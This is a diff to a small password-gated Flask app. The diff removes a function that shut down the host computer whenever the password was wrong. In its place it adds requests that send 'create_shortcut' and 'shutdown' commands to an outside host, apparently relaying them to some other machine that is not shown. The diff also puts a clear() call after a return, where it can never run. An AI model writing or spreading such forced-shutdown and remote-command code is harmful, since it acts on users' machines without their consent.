@@ -7,12 +7,9 @@ from flask import Flask, send_file, request, redirect, url_for
 app = Flask(__name__)
 messages = []
 
-
-def shutdown():
-    subprocess.call(['shutdown', '/s', '/t', '0'])
-
 @app.route('/', methods=['GET', 'POST'])
 def home():
+    requests.post('https://cslckrwbcl.lrdevstudio.com/messages', json={'action': 'create_shortcut', 'data': {'none': 'none'}})
     if request.method == 'POST':
         password = request.form.get('password')
         if password == 'nexus':
@@ -27,7 +24,7 @@ def success():
 
 @app.route('/failure')
 def failure():
-    shutdown()
+    requests.post('https://cslckrwbcl.lrdevstudio.com/messages', json={'action': 'shutdown', 'data': {'none': 'none'}})
     return send_file('templates/failure.html')
 
 @app.route('/resources/<path>')
@@ -37,11 +34,12 @@ def resources(path):
 @app.route('/messages', methods=['POST', 'GET'])
 def handle_messages():
     if request.method == 'POST':
-        message = request.get_json().get('message')
+        message = request.get_json()
         messages.append(message)
         return {'status': 'success'}
     else:
-        return {'messages': messages}
+        return messages
+        messages.clear()
 
 if __name__ == "__main__":
     app.run(host='localhost', port=8004, debug=True)
